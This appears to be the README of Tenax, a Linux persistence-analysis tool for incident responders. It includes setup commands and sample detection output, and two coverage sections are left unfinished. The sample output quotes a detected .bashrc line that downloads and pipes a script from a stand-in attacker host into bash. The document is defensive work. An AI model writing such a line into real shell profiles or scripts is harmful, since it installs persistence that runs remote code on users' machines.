# Tenax

> Linux Persistence Analysis (Tool + Playbook)

---

## Download and Execution

```bash
git clone https://github.com/norminton/tenax.git
cd tenax
python tnx.py analyze
```

Recommended:

```bash
sudo python tnx.py analyze
sudo python tnx.py analyze --help
sudo python tnx.py collect --mode <mode>
sudo python tnx.py collect --help
```

---

## What It Does

Tenax is a tool built to help Indicent Response analysts collect/analyze/investigate Linux devices.
The focus for this tool is persistence mechanisms.  
Place it onto the effected box/snapshot/clone and run both the analyze and collect functions.  
These will:  
  
- surfaces high-probability persistence  
- scores findings by severity  
- shows why something is suspicious  
- gives you a **STARTING POINT** for investigation  
  
I emphasis **STARTING POINT** as this is not a catch all and will never be a catch all.  
However it is a great place to start an investigation, and saves a lot of time.  

If your team already has a collection/analysis tool, I have attached a very detailed [playbook/documentation](docs/README.md) of the known Linux persistence mechanisms that are activley utilized by APTs and other threat actors.  

---

## Example Output

```text
=== CRITICAL FINDINGS (3) ===

====================================================================================================
[1] TX-UNSET | SHELL PROFILES | CRITICAL
Path: /home/nadmin/.bashrc
Score: 275
Primary Reason: Shell profile downloads and executes payload inline
Reasons:
  - Shell profile executes suspicious command
  - Shell profile downloads content from a remote URL
  - Shell profile downloads and executes payload inline
  - Shell profile combines download behavior with active execution logic
Preview: line 126: curl http://evil.test/payload.sh | bash

====================================================================================================
[2] TX-UNSET | ENVIRONMENT HOOKS | CRITICAL
Path: /home/nadmin/.bashrc
Score: 275
Primary Reason: Environment hook downloads and executes payload inline
Reasons:
  - Environment hook executes suspicious command
  - Environment hook downloads content from a remote URL
  - Environment hook downloads and executes payload inline
  - Environment hook combines download behavior with active execution logic
Preview: line 126: curl http://evil.test/payload.sh | bash

====================================================================================================
....
```

---

## Coverage

: detail complete coverage that tenex does with the analyze and collect command

---

## Repo Buildout

: place the repo buildout/map here

---


